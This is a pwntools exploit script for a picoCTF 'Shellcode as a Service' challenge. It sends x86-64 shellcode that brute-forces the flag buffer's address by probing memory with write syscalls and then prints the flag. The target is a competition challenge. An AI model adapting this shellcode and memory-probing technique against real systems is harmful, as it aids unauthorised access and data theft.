#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r, '''
                break *main+50
                ''')
    else:
        r = remote("mars.picoctf.net", 31021)

    return r

# FIXED SUFFIX FLAG BUFFER: 0x555----02060

def main():
    r = conn()

    # Goal: bruteforce the address of the flag buffer
    # NOTE: It might take a while and it could even timeout (in that case just re-run it)
    shellcode = '''
        /* Minimum base address obeserved from where we could start */
        mov r10, 0x555000002060
        loop:
        add r10, 0x100000

        /* Tries to write on STDOUT */
        mov rax, 1
        mov rdi, 1
        mov rsi, r10
        mov rdx, 100
        syscall

        /* Jump if it gives an error ($rax < 0) */
        cmp rax, 0
        jle loop
        
        /* Exit normally otherwise */
        mov rax, 60
        mov rdi, 0
        syscall
    '''

    r.sendlineafter(b'Welcome to Shellcode as a Service!\n', asm(shellcode))
    flag = r.recvlineS()
    print(flag)


if __name__ == "__main__":
    main()
